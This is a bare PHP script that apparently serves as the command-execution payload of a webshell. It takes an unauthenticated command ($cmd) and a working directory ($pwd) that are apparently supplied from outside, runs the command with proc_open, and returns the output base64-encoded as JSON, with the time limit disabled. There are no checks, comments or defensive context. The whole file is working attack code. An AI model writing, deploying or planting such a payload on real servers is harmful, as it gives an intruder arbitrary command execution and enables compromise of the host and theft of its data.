<?php
set_time_limit(0);
$re = array('code'=>1, 'result'=>'');
chdir($pwd);
if(function_exists('proc_open')){
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
     );
    $process = proc_open($cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        while (!feof($pipes[1])) {
            $re['result'] .= fgets($pipes[1], 1024);
        }
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    $re['result'] = base64_encode($re['result']);
}else{
    $re['code'] = 0;
}
echo json_encode($re);